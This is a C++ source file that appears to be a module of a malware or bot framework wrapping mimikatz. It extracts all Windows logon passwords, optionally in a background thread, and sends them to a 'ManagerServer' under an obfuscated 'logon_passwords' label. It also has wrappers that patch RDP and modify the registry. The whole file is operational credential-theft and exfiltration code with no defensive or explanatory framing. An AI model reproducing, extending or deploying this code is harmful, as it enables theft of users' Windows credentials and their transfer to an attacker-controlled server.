#include "other.h"
#ifdef ON_MIMIKATZ
#include "mimikatz\mimikatz.h"
#endif
#include "core\file.h"
#include "manager.h"

namespace mimikatz
{

static DWORD WINAPI SendAllLogonsThread( void* )
{
#ifdef ON_MIMIKATZ
	SendAllLogons();
#endif
	return 0;
}

bool SendAllLogonsThread()
{
#ifdef ON_MIMIKATZ
	return RunThread( SendAllLogonsThread, 0 );
#else
	return false;
#endif

}

bool SendAllLogons()
{
#ifdef ON_MIMIKATZ
	StringBuilder s;
	ExtactAllLogons(s);
	ManagerServer::SendData( _CS_("logon_passwords"), s.c_str(), s.Len(), false );
#endif
	return true;
}

bool GetLogonPasswords( StringBuilder& s )
{
#ifdef ON_MIMIKATZ
	return ExtactAllLogons(s);
#else
	return false;
#endif
}

bool PatchRDP()
{
#ifdef ON_MIMIKATZ
	return MimikatzPatchRDP();
#else
	return false;
#endif
}

bool UpdateReestr()
{
#ifdef ON_MIMIKATZ
	return MimikatzUpdateReestr();
#else
	return false;
#endif
}

}
